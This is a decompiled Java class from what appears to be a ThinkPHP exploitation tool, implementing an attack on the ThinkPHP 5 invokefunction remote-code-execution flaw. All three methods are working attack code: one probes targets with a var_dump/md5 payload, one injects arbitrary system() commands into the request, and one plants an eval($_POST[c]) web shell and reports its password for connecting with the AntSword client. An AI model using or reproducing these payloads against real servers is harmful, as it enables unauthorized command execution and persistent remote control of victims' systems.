/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_invoke_func_code_exec_2
/*    */   implements BaseExp {
/* 11 */   private String results = null;
/* 12 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 17 */     String payload0 = "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))";
/* 18 */     url = url + payload0;
/* 19 */     Response response = HttpTool.get(url, this.property);
/* 20 */     if (response.getText().contains("56540676a129760a")) {
/* 21 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 22 */       return this.results;
/*    */     } 
/* 24 */     if (response.getError() != null) {
/* 25 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 26 */       return this.results;
/*    */     } 
/* 28 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/*    */     
/* 30 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 35 */     String payload = "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=((md5(2333))" + cmd;
/* 36 */     url = url + payload;
/* 37 */     Response response = HttpTool.get(url, this.property);
/* 38 */     if (response.getError() == null) {
/* 39 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 41 */       this.results = response.getError();
/*    */     } 
/* 43 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 48 */     String payload = "/index.php?s=admin/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=${@print(eval($_POST[c]))}";
/* 49 */     Response response = HttpTool.post(url + payload, "c=phpinfo();", this.property);
/* 50 */     if (response.getError() == null && response.getText().contains("PHP Version")) {
/* 51 */       this.results = "[+] 执行成功，请使用蚁剑连接即可, 密码为c ：" + url + payload;
/*    */     } else {
/* 53 */       this.results = "[-] 上传失败: " + response.getError();
/*    */     } 
/* 55 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_invoke_func_code_exec_2.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */